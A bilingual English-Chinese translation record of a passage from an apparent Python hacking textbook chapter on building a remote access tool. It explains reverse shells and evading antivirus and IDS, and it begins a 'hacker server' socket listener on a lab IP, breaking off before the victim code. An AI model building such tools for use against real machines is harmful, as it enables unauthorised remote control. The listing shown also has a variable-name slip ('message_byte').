- en: '*Chapter 6*: Malware Development'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第6章*: 恶意软件开发'
- en: In previous chapters, we have learned how to gather information pertaining to
    the user and how this information can be used to attack the victim. In this chapter,
    we will move toward a new dimension and develop a **Remote Access Tool** (**RAT**).
    RATs allow pen testers to gain access to victims' computers remotely and are widely
    used in the field of cybersecurity. There are much more advanced RAT programs
    available on the internet. However, the goal of this chapter is to help you build
    your own RAT, which will give you far more advanced control.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在前几章中，我们学习了如何收集与用户相关的信息，以及这些信息如何被用来攻击受害者。在本章中，我们将进入一个新的维度，开发**远程访问工具**（**RAT**）。RAT允许渗透测试人员远程访问受害者的计算机，并广泛应用于网络安全领域。互联网上有许多更先进的RAT程序。然而，本章的目标是帮助你构建自己的RAT，这将使你能够获得更高级的控制。
- en: 'In this chapter, we will cover the following topics:'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本章我们将涵盖以下主题：
- en: Introduction to RATs
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: RAT简介
- en: Socket programming in Python
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Python中的套接字编程
- en: Creating malware
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 创建恶意软件
- en: Running commands remotely on the victim
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在受害者机器上远程执行命令
- en: Understanding RATs
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 了解RAT（远程访问工具）
- en: RATs have been widely used in cybersecurity and there are a lot of popular RATs
    available. Some hackers even offer customized and hard-to-detect RATs to be used
    to gain access to a victim's computer. In its simplest form, an RAT is a program
    that creates a network connection with another computer and performs an action.
    RATs can be legitimate software, such as a common commercial software such as
    TeamViewer, which is often used by IT professionals to diagnose remote computers
    and to detect problems. However, these programs can also be used by hackers to
    get control of the victim's machine, so you should be very careful in how you
    use these programs.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: RAT在网络安全中被广泛使用，市面上有许多流行的RAT工具。一些黑客甚至提供定制的、难以检测的RAT工具，用于获取受害者计算机的访问权限。在最简单的形式中，RAT是一种程序，它与另一台计算机建立网络连接并执行某个操作。RAT可以是合法软件，例如常见的商业软件TeamViewer，IT专业人员常用它来远程诊断计算机并检测问题。然而，这些程序也可以被黑客用来控制受害者的机器，因此你在使用这些程序时要非常小心。
- en: 'In its simplest form, an RAT is a pair of programs. One program runs on the
    victim, while the other program runs on the attacker''s machine. There are two
    main configurations in which these programs work depending on who initiates the
    communication. These are defined as follows:'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 在最简单的形式中，RAT是一对程序。一种程序在受害者的机器上运行，而另一种程序在攻击者的机器上运行。这些程序有两种主要配置，取决于谁发起通信。它们定义如下：
- en: A program in which the attacker initiates the connection, called a **forward
    connection**
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一种由攻击者发起连接的程序，称为**正向连接**
- en: A program that causes the victim's machine to create a connection to the hacker's
    machine, called a **reverse connection**
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使受害者的机器与黑客的机器建立连接的程序，称为**反向连接**
- en: Let's look at these in detail in the following sections.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来我们将详细讨论这些内容。
- en: Forward shell
  id: totrans-13
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 正向Shell
- en: In modern computer systems, a forward connection is almost impossible since
    the security configuration of most PCs does not allow remote devices to initiate
    a connection unless there are specific rules mentioned in the firewall. By default,
    all incoming connections are blocked by the firewall. These connections are only
    possible if an open port is present in the victim's machine that can be exploited
    by the hacker. However, you will find that this is not the case in most typical
    scenarios.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 在现代计算机系统中，正向连接几乎是不可能的，因为大多数个人电脑的安全配置不允许远程设备发起连接，除非防火墙中有特定规则。默认情况下，所有的入站连接都被防火墙阻止。只有在受害者的机器上存在可以被黑客利用的开放端口时，这些连接才有可能。然而，你会发现，在大多数典型的场景中，情况并非如此。
- en: Reverse shell
  id: totrans-15
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 反向Shell
- en: A reverse shell employs the opposite approach. Instead of the attacker initiating
    a connection to the victim, the attacker would plant a malware/**payload** (code
    that executes on the victim's machine). In this way, instead of an external connection,
    an internal connection from the victim would be initiated, which makes it much
    more difficult for **Intrusion Detection Systems** (**IDSes**) such as firewalls
    and antivirus programs to detect malicious activity on the system. The way this
    kind of attack is deployed is that the attacker sends a malicious file containing
    malware to the victim embedded in a PDF or JPEG file, for example. To the victim,
    it would look like an ordinary file, but when the victim clicks on the file to
    open it, a script is executed in the background that initiates a connection back
    to the attacker. Once the connection to the attacker is established, the attacker
    can easily take control of the victim's machine and execute commands remotely
    on the victim's machine. Now that we have understood forward shells and reverse
    shells, let's move on to discuss sockets in Python.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 反向 shell 采用相反的方法。攻击者不会主动发起连接到受害者，而是通过在受害者的机器上植入恶意软件/**有效载荷**（在受害者机器上执行的代码）。通过这种方式，不是外部连接，而是由受害者发起的内部连接，这使得**入侵检测系统**（**IDS**）如防火墙和杀毒程序更难检测系统上的恶意活动。此类攻击的部署方式是，攻击者将一个包含恶意软件的文件发送给受害者，该文件嵌入在
    PDF 或 JPEG 文件中。例如，受害者看到的会像是一个普通文件，但当受害者点击该文件并打开时，后台会执行一个脚本，从而发起连接回攻击者。一旦与攻击者的连接建立，攻击者就可以轻松地控制受害者的机器，并在受害者的机器上远程执行命令。现在我们已经了解了正向
    shell 和反向 shell，接下来我们来讨论 Python 中的套接字。
- en: Socket programming in Python
  id: totrans-17
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Python 中的套接字编程
- en: Before learning about malware development, it is necessary that we learn about
    network programming in Python and how we can create network applications. The
    first step in learning network programming is to learn about what we call *sockets*.
    Sockets provide a fundamental mechanism for creating network-based applications
    and our malware is going to be essentially a network application. Let's start
    by understanding sockets first.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 在学习恶意软件开发之前，我们必须先学习 Python 中的网络编程以及如何创建网络应用程序。学习网络编程的第一步是了解我们所称的 *套接字*。套接字为创建基于网络的应用程序提供了一个基本的机制，而我们的恶意软件本质上将是一个网络应用程序。让我们首先从理解套接字开始。
- en: Sockets
  id: totrans-19
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 套接字
- en: 'Before we jump into socket programming, let''s first understand what a network
    socket is and how it can be used to develop network-based applications. As we
    learned in previous chapters, the topmost layer in a network stack is an application
    layer. These are the applications that the user interacts with in everyday life.
    Now, the question is, how do these applications, which are developed in different
    programming languages, communicate over the network? The answer lies in the use
    of sockets. A socket is defined here: [https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html](https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html).'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们进入套接字编程之前，让我们先了解什么是网络套接字，以及它如何用于开发基于网络的应用程序。正如我们在前面的章节中学到的，网络协议栈的最上层是应用层。这些是用户在日常生活中与之交互的应用程序。现在，问题是，这些使用不同编程语言开发的应用程序如何在网络上进行通信呢？答案就在于套接字的使用。这里对套接字的定义是：[https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html](https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html)。
- en: A socket is one endpoint of a two-way communication link between two programs
    running on the network. A socket is bound to a port number so that the TCP layer
    can identify the application that data is destined to be sent to.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 套接字是网络中两个程序之间双向通信链路的一个端点。套接字绑定到一个端口号，以便 TCP 层可以识别数据应该发送到哪个应用程序。
- en: Sockets are generally used in client-server communication, where one node is
    a client initiating a connection, while the other node is a server responding
    to that connection. At each end of the connection, each process, such as a network
    initiation program or a network responding program, will employ a socket. A socket
    is typically identified by an IP address concatenated with a port number. In a
    typical scenario, a server usually listens on a certain port for incoming connection
    requests from clients. Once a client request arrives, the server accepts the request
    and initiates a socket connection with the client.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 套接字通常用于客户端-服务器通信，其中一个节点是发起连接的客户端，而另一个节点是响应该连接的服务器。在连接的每一端，每个进程，例如网络启动程序或网络响应程序，都将使用一个套接字。套接字通常通过一个
    IP 地址与一个端口号的组合来标识。在典型场景中，服务器通常会在某个端口上监听来自客户端的连接请求。一旦客户端请求到达，服务器就接受请求并与客户端建立套接字连接。
- en: Servers implementing specific services, such as **HTTP**, **FTP**, and **telnet**,
    listen on popular well-known ports such as **80**, **21**, and **23**. Ports from
    **1**-**1024** are regarded as well-known ports and should not be used in implementing
    your own programs as they are already reserved. Let's try to understand how sockets
    work in Python and, in the next section, we will learn how we can use this to
    our advantage to create our malware program.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 实现特定服务的服务器，如**HTTP**、**FTP**和**telnet**，会在常见的知名端口上监听，例如**80**、**21**和**23**。端口范围从**1**到**1024**被视为知名端口，不应在实现自己的程序时使用，因为它们已经被保留。在下一节中，我们将尝试理解
    Python 中套接字的工作原理，并了解如何利用这一点来创建我们的恶意软件程序。
- en: Creating a socket in Python
  id: totrans-24
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 在 Python 中创建一个套接字
- en: To create a socket in Python, we can utilize the **socket** library. This library
    is part of Python's standard package, so we don't need to install anything.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 要在 Python 中创建一个套接字，我们可以利用**socket**库。这个库是 Python 标准包的一部分，所以我们无需安装任何东西。
- en: 'This module can be imported by simply typing the following code:'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 只需输入以下代码即可导入此模块：
- en: import socket
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: Let's take a look at the **Application Programming Interface** (**API**) of
    this module. An API is a software interface to a code base that lets you access
    the functionality of the code with some level of abstraction.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看一下这个模块的**应用程序编程接口**（**API**）。API 是对代码库的软件接口，它让你以某种抽象层次访问代码的功能。
- en: socket.socket() API
  id: totrans-29
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: socket.socket() API
- en: 'To create a socket object, we can make use of the following function, called
    **socket()**. Let''s take a look at the parameters of this method. To see what
    parameters are available for a function in VS Code, you can simply write the function
    name and then, using VS Code Intelli Sense technology (which helps you write code
    and helps you with suggestions), you can see what parameters are required. To
    access this menu, if you just put your cursor on the name of the function, a small
    popup will appear, indicating the parameters required by this method. If you want
    to see the detailed implementation of this method, you can right-click on the
    name of the **socket** function and select **Go to definition**. This will open
    a file where this method is defined. Be careful not to change anything here. If
    you are not using VS Code, you can read the documentation relating to the Python
    socket module here: [https://docs.python.org/3/library/socket.html](https://docs.python.org/3/library/socket.html).
    The implementation of this method will look like this:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 要创建一个套接字对象，我们可以使用以下函数，称为**socket()**。让我们来看一下这个方法的参数。要查看在 VS Code 中函数可用的参数，你只需输入函数名，然后，利用
    VS Code 的 Intelli Sense 技术（它可以帮助你写代码并提供建议），你就可以看到该函数所需的参数。要访问这个菜单，只需将光标放在函数名上，弹出的小窗口就会显示该方法所需的参数。如果你想查看该方法的详细实现，可以右键点击**socket**函数的名称，选择**转到定义**。这将打开一个文件，其中定义了这个方法。请小心不要在这里做任何更改。如果你没有使用
    VS Code，你可以在这里阅读关于 Python socket 模块的文档：[https://docs.python.org/3/library/socket.html](https://docs.python.org/3/library/socket.html)。这个方法的实现大致如下：
- en: '![Figure 6.1 – Socket class constructor'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.1 – 套接字类构造函数'
- en: '](image/B14788_06_01.jpg)'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_01.jpg)'
- en: Figure 6.1 – Socket class constructor
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.1 – 套接字类构造函数
- en: The preceding screenshot shows that a socket is a class, and its constructor
    requires family, type, and proto parameters. We will discuss these parameters
    when we start building our programs in the next section of this chapter. For now,
    you just need to understand that calling the constructor of this **socket** class
    returns a socket object that can be used to communicate with other devices.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 上面的截图显示了 socket 是一个类，它的构造函数需要 family、type 和 proto 参数。我们将在本章下一节开始构建程序时讨论这些参数。现在，你只需要理解调用这个
    **socket** 类的构造函数会返回一个 socket 对象，可以用来与其他设备进行通信。
- en: socket.bind() API
  id: totrans-35
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: socket.bind() API
- en: Once you have created a socket object, to create a server, you need to bind
    a socket to the IP address and port that the socket will utilize for communication.
    Note that this function is only used when creating a **server** program. For servers,
    these must be explicitly assigned since the server has to listen for incoming
    connections on a specified port. In the case of a client, the IP and port are
    automatically assigned, so you will not use this function.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你创建了一个 socket 对象，要创建一个服务器，你需要将 socket 绑定到将用于通信的 IP 地址和端口。请注意，这个函数仅在创建**服务器**程序时使用。对于服务器，这些必须显式分配，因为服务器必须在指定的端口上监听传入的连接。而对于客户端，IP
    和端口会自动分配，因此你不会使用此函数。
- en: socket.listen() API
  id: totrans-37
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: socket.listen() API
- en: The **socket.listen()** method is used by servers to listen for any incoming
    connection as per the configuration assigned in the **socket.bind()** method.
    In other words, it waits for any connection attempt to the specified IP on the
    specified port. This requires a queue size for the number of connections to be
    held in a queue before it starts rejecting connections. For example, **socket.listen(5)**
    means that it will allow five connections at a time.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: '**socket.listen()** 方法被服务器用于根据 **socket.bind()** 方法中配置的参数监听任何传入的连接。换句话说，它会等待任何连接尝试，指定的
    IP 上指定的端口。此方法需要一个队列大小，表示在开始拒绝连接之前，允许在队列中保存的连接数。例如，**socket.listen(5)** 意味着它一次最多允许五个连接。'
- en: socket.accept() API
  id: totrans-39
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: socket.accept() API
- en: As the name indicates, the **socket.accept()** API accepts connections made
    by clients. This is a **blocking function** call, which means that program execution
    will pause here until a connection is successfully made. Once a connection is
    made, execution of the program will continue.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 如其名称所示，**socket.accept()** API 用于接受客户端发起的连接。这是一个**阻塞函数**调用，意味着程序执行将在此暂停，直到成功建立连接。一旦连接建立，程序执行将继续进行。
- en: socket.connect()
  id: totrans-41
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: socket.connect()
- en: As we have seen that **socket.accept()** blocks execution until a client connects,
    the question now arises, how do clients connect? This is where **socket.connect()**
    comes into play. This method initiates a connection to the server and if a server
    is waiting for incoming connections, communication will follow. When a call to
    **socket.connect()** happens, **socket.accept()** gets unblocked in the server
    and execution of the program continues. Don't worry if this all seems very confusing
    to you at the moment as to which functions are called in the server, and which
    functions in the client. You will get a clear idea of this when we build examples.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们已经看到的，**socket.accept()** 会阻塞执行，直到客户端连接，接下来就出现了一个问题，客户端如何连接？这时**socket.connect()**
    就发挥作用了。此方法用于发起与服务器的连接，如果服务器正在等待传入连接，通信将开始。当调用 **socket.connect()** 时，服务器中的 **socket.accept()**
    会解除阻塞，程序的执行将继续进行。如果你现在感到困惑，不知道哪些函数在服务器中调用，哪些在客户端中调用，不用担心。当我们构建示例时，你将清楚理解这些内容。
- en: socket.send()
  id: totrans-43
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: socket.send()
- en: Once the connection is made between the server and client programs, the most
    important part of the program comes, which is to send data over these connections.
    This is where most of the user-defined logic will reside. The **socket.send()**
    method is used to send bytes over the network. Note that the input to this function
    is bytes, so any data you want to send over this connection should be in the form
    of bytes. It is the responsibility of the user to encode the appropriate data
    into bytes and to decode at the receiving end.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦服务器和客户端程序之间建立了连接，程序的最重要部分就开始了，那就是通过这些连接发送数据。这是大多数用户自定义逻辑所在的地方。**socket.send()**
    方法用于通过网络发送字节。请注意，该函数的输入是字节，因此你想要通过此连接发送的任何数据都应该以字节的形式存在。用户有责任将适当的数据编码为字节，并在接收端进行解码。
- en: Socket.recv()
  id: totrans-45
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Socket.recv()
- en: This method, as the name suggests, is used to receive bytes once the user sends
    the data. Note that every call to the send or receive methods should be handled
    properly. For example, if the server is sending data, the client should be ready
    to receive this data and vice versa. The input to this method is the number of
    bytes you want to receive at once. This is the buffer created by the program to
    temporarily store data, and once a certain number of bytes arrive, they can be
    read, and the buffer is ready for the next cycle.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 如其名称所示，这种方法用于在用户发送数据后接收字节。请注意，每次调用发送或接收方法时，都应妥善处理。例如，如果服务器正在发送数据，则客户端应准备好接收这些数据，反之亦然。该方法的输入是您希望一次接收的字节数。这是程序创建的缓冲区，用于暂时存储数据，一旦接收到一定数量的字节，就可以读取数据，缓冲区也准备好进行下一轮操作。
- en: socket.close()
  id: totrans-47
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: socket.close()
- en: Once you have done everything you wanted to do with a program, you must close
    the socket so that the port can become available to other programs to be used.
    Note that even if you don't close the socket properly, it will be released by
    your operating system after a period of time once your program exits or your computer
    restarts. However, it is always a good idea to close these sockets manually inside
    the program. If the program exits and the socket is not closed properly, any incoming
    requests may be blocked, or the operating system may refuse to use this socket
    for the next program because it may think that the port is still in use.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦完成了您想要在程序中执行的所有操作，必须关闭套接字，以便该端口可以被其他程序使用。请注意，即使您没有正确关闭套接字，当程序退出或计算机重启后，操作系统也会在一段时间后释放它。然而，手动在程序中关闭这些套接字始终是个好主意。如果程序退出时套接字没有正确关闭，任何传入的请求可能会被阻塞，或者操作系统可能会拒绝让下一个程序使用该套接字，因为它可能认为该端口仍在使用中。
- en: Fitting it altogether
  id: totrans-49
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 将它们组合起来
- en: 'Until now, we have learned different methods of the socket API, but to get
    a clear understanding of how and where each function is used, I will summarize
    everything here. We will have two programs running separately. One will be the
    server listening for incoming connections, and the other will be the client trying
    to make a connection. Let''s take a look at the following diagram to see how things
    fit together in the socket API:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们已经学习了套接字 API 的不同方法，但为了清楚理解每个函数如何以及在何处使用，我将在这里总结所有内容。我们将分别运行两个程序。一个将作为服务器监听传入的连接，另一个将作为客户端尝试建立连接。让我们看一下下面的图表，看看套接字
    API 中各部分如何组合在一起：
- en: '![Figure 6.2 – Client and server socket usage in Python'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.2 – Python 中的客户端和服务器套接字使用'
- en: '](image/B14788_06_02.jpg)'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_02.jpg)'
- en: Figure 6.2 – Client and server socket usage in Python
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.2 – Python 中的客户端和服务器套接字使用
- en: The diagram shows two separate programs running concurrently, namely, the client
    and server. You may be wondering how this client and server relate to our hacking
    purposes? Well, we will use a similar approach to develop our malware. We will
    write two programs. One program will run on the hacker's machine, we will call
    this the server/hacker program, and the other will run on the client; we will
    refer to this as the victim program. The victim program will try to connect with
    the hacker program. This way, since the connection is originating from the victim's
    machine, the antivirus or IDS will not block it. In this section, we have learned
    how socket programming in Python works. We didn't go into much detail in terms
    of how we create these programs. In the next section, we will make use of this
    socket API to create our victim and the hacker parts of the malware.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 图中显示了两个并行运行的程序，即客户端和服务器。你可能会想，这个客户端和服务器如何与我们的黑客目的相关？实际上，我们将采用类似的方式来开发恶意软件。我们将编写两个程序。一个程序将在黑客的机器上运行，我们将其称为服务器/黑客程序，另一个程序将在客户端上运行；我们将其称为受害者程序。受害者程序将尝试与黑客程序建立连接。这样，由于连接是从受害者的机器发起的，防病毒软件或入侵检测系统（IDS）将不会阻止它。在本节中，我们了解了如何使用
    Python 进行套接字编程。我们没有深入讲解如何创建这些程序。在下一节中，我们将利用这个套接字 API 来创建恶意软件中的受害者和黑客部分。
- en: Creating malware
  id: totrans-55
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 创建恶意软件
- en: Now that we have seen what the outline of our malware program will look like,
    let's start writing our hacker and victim programs.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经看到了恶意软件程序的大致框架，让我们开始编写我们的黑客和受害者程序。
- en: Hacker server
  id: totrans-57
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 黑客服务器
- en: In this section, we will write a program for the hacker server, which will constantly
    listen for incoming connections originating from the victim's machine to the hacker.
    Let's go to our Kali machine and create a new project called **hacker server**.
    Also, create a new virtual environment, as we have done in previous chapters.
    We will not require any external library in this section, but it is always a good
    idea to use virtual environments to keep track of dependencies in our program.
    Also, create a new file called **server.py**.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分，我们将编写黑客服务器的程序，它将持续监听来自受害者机器到黑客机器的传入连接。让我们去我们的 Kali 机器，创建一个名为**hacker server**的新项目。同时，像前几章一样创建一个新的虚拟环境。此部分我们不需要任何外部库，但使用虚拟环境来跟踪程序中的依赖总是一个好主意。还要创建一个名为**server.py**的新文件。
- en: 'The IP address of our Kali machine is **192.168.74.128**, and for the victim''s
    Windows machine, it is **192.168.74.129**. Next, we need to select which port
    we will be listening on for incoming connections. You can select any port above
    **1024** and less than **65355**. However, we will use port number **8008**. This
    will be the port we bind the server to, and if the client wants to connect with
    the server, it needs to use this port. Let''s import the socket module and create
    a socket object. Take a look at the following code:'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 我们 Kali 机器的 IP 地址是**192.168.74.128**，而受害者的 Windows 机器的 IP 地址是**192.168.74.129**。接下来，我们需要选择监听的端口，用于接收传入的连接。你可以选择一个大于**1024**且小于**65355**的端口。然而，我们将使用端口号**8008**。这将是我们绑定服务器的端口，如果客户端想要连接到服务器，它需要使用这个端口。让我们导入
    socket 模块并创建一个 socket 对象。看一下以下代码：
- en: import socket
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 导入 socket
- en: 'if __name__ == "__main__":'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: Here, on the first line, we are simply importing the **socket** module from
    the Python standard library. Next, we are creating a socket object. The two parameters
    are **socket.AF_INET** and **socket.SOCK_STREAM**. Let's see what they mean. Remember
    that we talked about the IPv4 and IPv6 addresses? This is exactly what **socket.AF_INET**
    means. We are using IPv4, which is denoted by **socket.AF_INET**. If you want
    to use IPv6 (which you probably won't), you can select **socket.AF_INET6**. Next,
    we need to define what network layer protocol we want to use. Here, we have options
    for either TCP or UDP. In our examples, we want to use a reliable connection,
    so we will choose TCP. **socket.SOCK_STREAM** means that we are creating a TCP
    socket. If you want to create a UDP socket (which, again, you probably won't for
    the most part), you can use **socket.SOCK_DGRAM**.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 在第一行，我们只是从 Python 标准库中导入了**socket**模块。接下来，我们正在创建一个 socket 对象。两个参数是**socket.AF_INET**和**socket.SOCK_STREAM**。让我们看看它们的含义。记得我们之前提到过
    IPv4 和 IPv6 地址吗？这正是**socket.AF_INET**的含义。我们正在使用 IPv4，它由**socket.AF_INET**表示。如果你想使用
    IPv6（虽然你可能不会），你可以选择**socket.AF_INET6**。接下来，我们需要定义想要使用的网络层协议。在这里，我们可以选择 TCP 或 UDP。在我们的示例中，我们想要使用可靠的连接，因此我们将选择
    TCP。**socket.SOCK_STREAM**意味着我们正在创建一个 TCP socket。如果你想创建一个 UDP socket（不过，你可能大部分时间都不会这么做），你可以使用**socket.SOCK_DGRAM**。
- en: 'Next, we will bind this server to the Kali''s IP address and port **8008**:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将把这个服务器绑定到 Kali 的 IP 地址和端口**8008**：
- en: IP = "192.168.74.128"
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: IP = "192.168.74.128"
- en: Port = 8008
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: Port = 8008
- en: socket_address = (IP, Port)
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: socket_address = (IP, Port)
- en: hacker_socket.bind(socket_address)
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.bind(socket_address)
- en: Note that you have to give the IP address and port in *tuple* form to the **socket.bind()**
    method.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，你需要以*元组*形式将 IP 地址和端口传递给**socket.bind()**方法。
- en: 'Next, we need to listen for incoming connections on the specified socket with
    the help of the following command:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们需要使用以下命令来监听指定的 socket 上的传入连接：
- en: hacker_socket.listen(5)
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.listen(5)
- en: 'Now that our program configuration is almost complete, we can start listening
    for incoming connection requests:'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们的程序配置几乎完成，可以开始监听传入的连接请求了：
- en: hacker_socket.listen(5)
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.listen(5)
- en: print("listening for incoming connection requests")
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: print("正在监听传入的连接请求")
- en: hacker_socket, client_address = hacker_socket.accept()
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket, client_address = hacker_socket.accept()
- en: Execution of the program will pause here. Once the client has connected, this
    method will return two parameters. The first is **hacker_socket**, which we can
    use to send and receive data, and the second is the address of the victim. This
    will help the program to know which client is connected.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 程序的执行将在这里暂停。一旦客户端连接，方法将返回两个参数。第一个是**hacker_socket**，我们可以用它来发送和接收数据，第二个是受害者的地址。这将帮助程序知道哪个客户端已连接。
- en: 'Once the connection has been accepted, we can use this socket to send a message
    over the network. As mentioned earlier, the accept function is blocking, which
    means that execution is paused here until someone connects. To demonstrate this,
    let''s run the program. You will see the following output:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦连接被接受，我们就可以使用这个 socket 通过网络发送消息。正如之前所提到的，accept 函数是阻塞的，这意味着执行将在此暂停，直到有人连接。为了演示这一点，我们可以运行程序。你将看到以下输出：
- en: '![Figure 6.3 – Waiting for incoming connections'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.3 – 等待传入连接'
- en: '](image/B14788_06_03.jpg)'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_03.jpg)'
- en: Figure 6.3 – Waiting for incoming connections
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.3 – 等待传入连接
- en: 'You will see that programs don''t move past this step. You can press *Ctrl
    + C* to exit the program. Now, let''s try to send a simple message from the *hacker*
    to the victim. For now, we will send a simple string, but in later sections, we
    will send more advanced data, such as files:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 你将看到程序不会超过此步骤。你可以按 *Ctrl + C* 退出程序。现在，让我们尝试从 *黑客* 向受害者发送一条简单的消息。现在，我们将发送一个简单的字符串，但在后面的章节中，我们将发送更复杂的数据，例如文件：
- en: message = "Message from hacker"
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: message = "Message from hacker"
- en: message_bytes = message.encode()
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: message_bytes = message.encode()
- en: hacker_socket.send(message_byte)
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.send(message_byte)
- en: print("Message sent from hacker")
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: print("Message sent from hacker")
- en: The **message.encode()** method converts the message string into bytes, as the
    **socket.send()** method only accepts bytes.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: '**message.encode()** 方法将消息字符串转换为字节，因为 **socket.send()** 方法只接受字节。'
- en: Finally, we will close this socket by calling the **close()** method.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们通过调用 **close()** 方法关闭此 socket。
- en: 'The complete code for the hacker program is shown as follows:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 黑客程序的完整代码如下所示：
- en: import socket
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: 'if __name__ == "__main__":'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
